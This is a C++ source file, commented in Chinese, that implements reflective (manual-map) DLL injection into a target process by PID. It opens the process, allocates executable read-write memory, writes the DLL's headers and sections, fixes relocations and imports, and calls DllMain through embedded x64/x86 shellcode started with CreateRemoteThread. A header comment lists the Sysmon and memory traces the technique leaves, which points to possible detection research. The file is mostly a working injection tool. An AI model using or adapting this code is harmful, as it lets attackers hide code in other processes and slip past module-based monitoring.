// ════════════════════════════════════════════════════════════════
//  方法 5: 反射式注入 — DLL 不落地，手动映射到目标进程
//
//  原理：
//    1. 读取 DLL 文件到本进程内存缓冲区
//    2. 解析 PE 头，获取 SizeOfImage
//    3. 在目标进程分配 SizeOfImage 大小的内存
//    4. 复制 PE 头 + 各节区到目标进程
//    5. 修复重定位表（重定位到新的基址）
//    6. 解析导入表，加载依赖 DLL
//    7. 修复 IAT（Import Address Table）
//    8. 调用 DLL 入口点 (DllMain)
//
//  检测特征：
//    - Sysmon Event 7:  不触发（没走 LoadLibrary）
//    - Sysmon Event 10: VirtualAllocEx(PAGE_EXECUTE_READWRITE)
//    - VirtualQueryEx:  MEM_PRIVATE + PAGE_EXECUTE_READ（非 MEM_IMAGE）→ 强特征
//    - 模块快照 diff:   TH32CS_SNAPMODULE 看不到它 → 但内存中有可执行页
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <fstream>
#include <vector>

// ── 辅助：读取 DLL 文件 ──────────────────────────────────────
static std::vector<uint8_t> ReadFile(const wchar_t* path)
{
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f.is_open()) return {};
    auto size = f.tellg();
    f.seekg(0);
    std::vector<uint8_t> buf(static_cast<size_t>(size));
    f.read(reinterpret_cast<char*>(buf.data()), size);
    return buf;
}

bool Inject_Reflective(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 反射式注入 → PID=%lu\n", pid);

    // ── 1. 读取 DLL 文件 ──
    auto dllData = ReadFile(dllPath);
    if (dllData.empty())
    {
        Print(L"  [!] 无法读取 DLL: %s\n", dllPath);
        return false;
    }
    Print(L"  [+] DLL 大小: %zu bytes\n", dllData.size());

    // ── 2. 解析 PE 头 ──
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(dllData.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        Print(L"  [!] 无效的 DOS 签名\n");
        return false;
    }

    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        dllData.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        Print(L"  [!] 无效的 NT 签名\n");
        return false;
    }

#ifdef _WIN64
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        Print(L"  [!] 架构不匹配 (需要 x64 DLL)\n");
        return false;
    }
#else
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
    {
        Print(L"  [!] 架构不匹配 (需要 x86 DLL)\n");
        return false;
    }
#endif

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    DWORD entryRVA  = nt->OptionalHeader.AddressOfEntryPoint;
    Print(L"  [+] SizeOfImage=%lu  EntryPoint RVA=%lX\n", imageSize, entryRVA);

    // ── 3. 打开目标进程，分配内存 ──
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    LPVOID remoteBase = VirtualAllocEx(hProc, nullptr, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase)
    {
        Print(L"  [!] VirtualAllocEx 失败: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }
    Print(L"  [+] 目标进程已分配 %lu bytes @ %p\n", imageSize, remoteBase);

    // ── 4. 复制 PE 头 ──
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    WriteProcessMemory(hProc, remoteBase, dllData.data(), headerSize, nullptr);

    // ── 5. 复制各节区 ──
    auto section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++)
    {
        if (section->SizeOfRawData == 0) continue;

        LPVOID dest = (LPVOID)((uintptr_t)remoteBase + section->VirtualAddress);
        LPCVOID src = dllData.data() + section->PointerToRawData;

        WriteProcessMemory(hProc, dest, src, section->SizeOfRawData, nullptr);
        Print(L"      节区 %-8S  RVA=%05lX  Size=%05lX\n",
                section->Name, section->VirtualAddress, section->SizeOfRawData);
    }

    // ── 6. 修复重定位表 ──
    uintptr_t deltaBase = (uintptr_t)remoteBase - nt->OptionalHeader.ImageBase;
    if (deltaBase != 0)
    {
        auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0)
        {
            auto relocStart = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                dllData.data() + relocDir.VirtualAddress);
            auto relocEnd = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                dllData.data() + relocDir.VirtualAddress + relocDir.Size);

            int fixCount = 0;
            while (relocStart < relocEnd && relocStart->SizeOfBlock > 0)
            {
                DWORD count = (relocStart->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                auto entries = reinterpret_cast<uint16_t*>(
                    reinterpret_cast<uint8_t*>(relocStart) + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD j = 0; j < count; j++)
                {
                    int type   = entries[j] >> 12;
                    int offset = entries[j] & 0xFFF;
                    uintptr_t patchAddr = (uintptr_t)remoteBase + relocStart->VirtualAddress + offset;

                    if (type == IMAGE_REL_BASED_DIR64)
                    {
                        uint64_t val = 0;
                        ReadProcessMemory(hProc, (LPCVOID)patchAddr, &val, 8, nullptr);
                        val += deltaBase;
                        WriteProcessMemory(hProc, (LPVOID)patchAddr, &val, 8, nullptr);
                        fixCount++;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW)
                    {
                        uint32_t val = 0;
                        ReadProcessMemory(hProc, (LPCVOID)patchAddr, &val, 4, nullptr);
                        val += (uint32_t)deltaBase;
                        WriteProcessMemory(hProc, (LPVOID)patchAddr, &val, 4, nullptr);
                        fixCount++;
                    }
                }
                relocStart = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<uint8_t*>(relocStart) + relocStart->SizeOfBlock);
            }
            Print(L"  [+] 重定位修复: %d 项\n", fixCount);
        }
    }

    // ── 7. 解析导入表，修复 IAT ──
    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0)
    {
        auto importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            dllData.data() + importDir.VirtualAddress);

        while (importDesc->Name)
        {
            char* moduleName = reinterpret_cast<char*>(
                dllData.data() + importDesc->Name);

            // 在本进程加载依赖 DLL（获取函数地址）
            HMODULE hMod = LoadLibraryA(moduleName);
            if (!hMod)
            {
                Print(L"  [!] 无法加载依赖: %hs\n", moduleName);
                importDesc++;
                continue;
            }

            // 修复 IAT
            auto thunkRef = reinterpret_cast<uintptr_t*>(
                dllData.data() + importDesc->OriginalFirstThunk);
            auto funcRef  = reinterpret_cast<uintptr_t*>(
                dllData.data() + importDesc->FirstThunk);

            if (!importDesc->OriginalFirstThunk)
                thunkRef = funcRef;

            while (*thunkRef)
            {
                uintptr_t funcAddr = 0;
                if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
                {
                    // 按序号导入
                    WORD ordinal = (WORD)IMAGE_ORDINAL(*thunkRef);
                    funcAddr = (uintptr_t)GetProcAddress(hMod, MAKEINTRESOURCEA(ordinal));
                }
                else
                {
                    // 按名称导入
                    auto importByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        dllData.data() + *thunkRef);
                    funcAddr = (uintptr_t)GetProcAddress(hMod, importByName->Name);
                }

                // 写入修复后的地址到目标进程
                uintptr_t iatAddr = (uintptr_t)remoteBase + importDesc->FirstThunk +
                    ((uintptr_t)funcRef - (uintptr_t)(dllData.data() + importDesc->FirstThunk));
                WriteProcessMemory(hProc, (LPVOID)iatAddr, &funcAddr, sizeof(funcAddr), nullptr);

                thunkRef++;
                funcRef++;
            }

            Print(L"      导入: %hs\n", moduleName);
            importDesc++;
        }
    }

    // ── 8. 远程调用 DllMain ──
    if (entryRVA != 0)
    {
        LPVOID entryPoint = (LPVOID)((uintptr_t)remoteBase + entryRVA);
        Print(L"  [+] 入口点: %p\n", entryPoint);

        // DllMain(hModule, DLL_PROCESS_ATTACH, nullptr)
        // 通过远程线程传递参数
        // 先写一个简单的 shellcode 来调用 DllMain
        // shellcode: mov rcx, hModule; mov edx, DLL_PROCESS_ATTACH; xor r8, r8; call entryPoint; ret

#ifdef _WIN64
        uint8_t callShellcode[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, remoteBase
            0xBA, 0x01, 0x00, 0x00, 0x00,                                 // mov edx, DLL_PROCESS_ATTACH
            0x4D, 0x31, 0xC0,                                             // xor r8, r8
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, entryPoint
            0xFF, 0xD0,                                                   // call rax
            0xC3,                                                         // ret
        };
        memcpy(callShellcode + 2, &remoteBase, 8);
        memcpy(callShellcode + 19, &entryPoint, 8);
#else
        uint8_t callShellcode[] = {
            0x68, 0x00, 0x00, 0x00, 0x00,                                 // push 0 (lpvReserved)
            0x68, 0x01, 0x00, 0x00, 0x00,                                 // push DLL_PROCESS_ATTACH
            0x68, 0x00, 0x00, 0x00, 0x00,                                 // push remoteBase (hModule)
            0xB8, 0x00, 0x00, 0x00, 0x00,                                 // mov eax, entryPoint
            0xFF, 0xD0,                                                   // call eax
            0xC3,                                                         // ret
        };
        auto base = (uint32_t)(uintptr_t)remoteBase;
        auto ep   = (uint32_t)(uintptr_t)entryPoint;
        memcpy(callShellcode + 1, &base, 4);
        memcpy(callShellcode + 11, &ep, 4);
#endif

        LPVOID remoteShellcode = VirtualAllocEx(hProc, nullptr, sizeof(callShellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hProc, remoteShellcode, callShellcode, sizeof(callShellcode), nullptr);

        DWORD tid = 0;
        HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
            (LPTHREAD_START_ROUTINE)remoteShellcode, nullptr, 0, &tid);

        if (hThread)
        {
            Print(L"  [+] DllMain 远程线程已创建 TID=%lu\n", tid);
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        else
        {
            Print(L"  [!] CreateRemoteThread(DllMain) 失败: %lu\n", GetLastError());
        }

        VirtualFreeEx(hProc, remoteShellcode, 0, MEM_RELEASE);
    }

    // 注意：不释放 remoteBase，DLL 代码还在用
    CloseHandle(hProc);

    Print(L"  [✓] 反射式注入完成\n");
    return true;
}
